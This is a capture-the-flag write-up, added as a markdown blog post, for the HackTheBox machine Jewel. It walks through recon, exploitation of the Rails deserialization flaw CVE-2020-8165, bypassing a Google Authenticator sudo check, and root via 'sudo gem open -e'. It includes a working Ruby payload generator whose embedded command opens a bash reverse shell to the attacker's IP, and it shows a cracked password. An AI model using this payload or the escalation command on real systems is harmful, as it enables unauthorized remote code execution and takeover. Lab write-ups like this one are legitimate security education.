@@ -1,0 +1,185 @@
+---
+title: HackTheBox Jewel Write Up
+description: My writeup for jewel, a medium difficulty linux machine on HackTheBox platform
+pubDate: 2021-02-13
+categName: hack-the-box
+tagList: htb,linux,git,cve
+author: thewhiteh4t
+cardImage: ../../assets/post_imgs/htb-jewel-writeup/cardImage.jpg
+---
+```
+---------------------------------
+--- Name       : Jewel ----------
+--- IP Address : 10.10.10.211 ---
+--- Platform   : Linux ----------
+--- Difficulty : Medium ---------
+---------------------------------
+```
+
+Jewel is one of the most innovative machines I have solved on HTB platform, it shows a de-serialization vulnerability in rails along with working around google authentication followed by privilege escalation using ruby gems.
+
+## Reconnaissance
+
+Fast 1K port scan using FinalRecon followed by service/version enumeration on open ports using nmap...
+
+```bash
+$ finalrecon --ps http://10.10.10.211
+
+ ______  __   __   __   ______   __
+/\  ___\/\ \ /\ "-.\ \ /\  __ \ /\ \
+\ \  __\\ \ \\ \ \-.  \\ \  __ \\ \ \____
+ \ \_\   \ \_\\ \_\\"\_\\ \_\ \_\\ \_____\
+  \/_/    \/_/ \/_/ \/_/ \/_/\/_/ \/_____/
+ ______   ______   ______   ______   __   __
+/\  == \ /\  ___\ /\  ___\ /\  __ \ /\ "-.\ \
+\ \  __< \ \  __\ \ \ \____\ \ \/\ \\ \ \-.  \
+ \ \_\ \_\\ \_____\\ \_____\\ \_____\\ \_\\"\_\
+  \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/ \/_/
+
+[>] Created By : thewhiteh4t
+[>] Version    : 1.0.7
+
+[+] Checking for Updates...[ Up-To-Date ]
+
+[+] Target : http://10.10.10.211
+
+[!] Starting Port Scan...
+
+[+] Testing Top 1000 Ports...
+
+[+] 22     ssh
+[+] 8080   http-alt
+[+] 8000   irdmi
+
+[+] Completed in 0:00:03.191492
+```
+
+```bash
+$ nmap -p 22,8080,8000 -sV 10.10.10.211 -Pn
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 21:18 IST
+Nmap scan report for 10.10.10.211
+Host is up (0.083s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+8000/tcp open  http    Apache httpd 2.4.38
+8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
+```
+
+On port 8080 there is a blog page, I did not find much in the source code so I moved to port 8000 where i found GitWeb, a simple web visualizer for the git service.
+
+[Read More](http://git-scm.com/book/en/v2/Git-on-the-Server-GitWeb)
+
+Further inspecting the page and files I found multiple things...
+
+![](https://i.imgur.com/UHEDpTw.png)
+
+Email address of the author is visible along with a possible username "bill", Gemfile and Rakefile can also be seen which are associated with ruby. Inside Gemfile I found the versions of ruby, rails and bcrypt along with other modules...
+
+![](https://i.imgur.com/xoN1obW.png)
+
+On further inspection of visible files I found some hashes in "bd.sql" file...
+
+![](https://i.imgur.com/MFnna97.png)
+
+```
+bill - $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+jennifer - $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
+```
+
+Both hashes are bcrypt with 12 rounds, I tried to crack both hashes with john but that did not help so next I started looking for a vulnerability in GitWeb and rails.
+
+## CVE-2020-8165
+
+[NVD Advisory](https://nvd.nist.gov/vuln/detail/CVE-2020-8165)
+
+A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE. You can read more about the vulnerability in this [Hackerone Report](https://hackerone.com/reports/413388). The flaw can be spotted in "users_controller.rb" file on line number 37
+
+![](https://i.imgur.com/i8Wn6wq.png)
+
+## Intrusion
+
+The flaw is in the update functionality of the web application which is being used to update the username in user profile. I signed up in the blog on port 8080 and used the exploit I found here : [CVE-2020-8165 Exploit by masahiro331](https://github.com/masahiro331/CVE-2020-8165) to write a ruby script which will generate the required payload for getting RCE on the target...
+
+```bash
+$ cat payload.rb
+
+require 'erb'
+require 'uri'
+require 'active_support'
+require 'active_support/core_ext'
+
+code = '`/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"`'
+
+erb = ERB.allocate
+erb.instance_variable_set :@src, code
+erb.instance_variable_set :@filename, "1"
+erb.instance_variable_set :@lineno, 1
+
+payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
+
+puts URI.encode_www_form(payload: payload)
+```
+
+![](https://i.imgur.com/yoaU3Sj.png)
+
+I sent the payload in the username field of the request I intercepted using burp as you can see below...
+
+![](https://i.imgur.com/biKr0kB.png)
+
+In the vulnerable code above, you can see that on line 40 the page is supposed to be redirected to articles page i.e. the home page, payload triggered as soon as I visited the home page and I got foothold!
+
+![](https://i.imgur.com/vTHj48G.png)
+
+The username is bill and I got the user flag in home directory.
+
+## Enumeration
+
+After some poking around I found a sql file in the following path...
+
+![](https://i.imgur.com/8kJ7QO3.png)
+
+You can see that although the file is owned by root but its permissions are misconfigured and it is readable, inside I found another bcrypt hash for our user "bill"
+
+![](https://i.imgur.com/Hng73bV.png)
+
+This hash got cracked successfully using john and I got a password for bill here...
+
+```
+bill:spongebob
+```
+
+## Privilege Escalation
+
+First thing I tried was to execute sudo with "-l" flag which lists the privileges of the user but it asks for a verification code! Now I started looking for the origin of this verification system...
+
+![](https://i.imgur.com/SRxh3Zv.png)
+
+In the home directory I found a dot file, google-authenticator which contains a 26 character long alphanumeric string...
+
+![](https://i.imgur.com/c6SZ5xg.png)
+
+Fortunately I use google authenticator app and it offers two methods to add a new entry
+
+![](https://i.imgur.com/jKeive5.png)
+
+I tried adding the alphanumeric string I found earlier into setup using key option and it worked, google authenticator is now generating codes!
+
+![](https://i.imgur.com/j0T6neJ.png)
+
+and now I was finally able to use sudo and I found that our user bill can execute gem command!
+
+![](https://i.imgur.com/8I00fkw.png)
+
+I used the following command to escalate privileges...
+
+```bash
+# https://gtfobins.github.io/gtfobins/gem/
+
+$ sudo gem open -e "/bin/sh -c /bin/bash" rdoc
+```
+
+![](https://i.imgur.com/28jgQ3J.png)
+
+Solved!
